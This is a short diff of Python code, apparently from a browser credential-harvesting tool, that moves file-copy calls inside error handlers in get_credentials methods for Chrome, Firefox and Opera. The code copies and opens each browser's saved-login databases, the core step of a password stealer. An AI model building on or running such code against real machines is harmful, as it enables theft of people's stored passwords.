@@ -67,8 +67,8 @@ class Chrome(object):
         return None
 
     def get_credentials(self):
-        shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat')
         try:
+            shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat') 
             path = os.path.join(self.path, 'Login Data.dat')
             with sqlite3.connect(path) as conn:
                 cursor = conn.cursor()
@@ -111,8 +111,8 @@ class Firefox(object):
         for file in os.listdir(self.path):
             if os.path.isfile(self.path + '\\' + file):
                 if file == self.possible_login_files[0]:
-                    shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                     try:
+                        shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                         with open(self.path + '\\' + file + '.dat', 'r') as json_file:
                             data = json.load(json_file)
                             logins = data['logins']
@@ -121,8 +121,8 @@ class Firefox(object):
                     except:
                         return None
                 if file == self.possible_login_files[1]:
-                    shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                     try:
+                        shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                         path = os.path.join(self.path, file + '.dat')
                         with sqlite3.connect(path) as conn:
                             cursor = conn.cursor()
@@ -159,8 +159,8 @@ class Opera(object):
         return path
 
     def get_credentials(self):
-        shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat')
         try:
+            shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat')
             path = os.path.join(self.path, 'Login Data.dat')
             with sqlite3.connect(path) as conn:
                 cursor = conn.cursor()
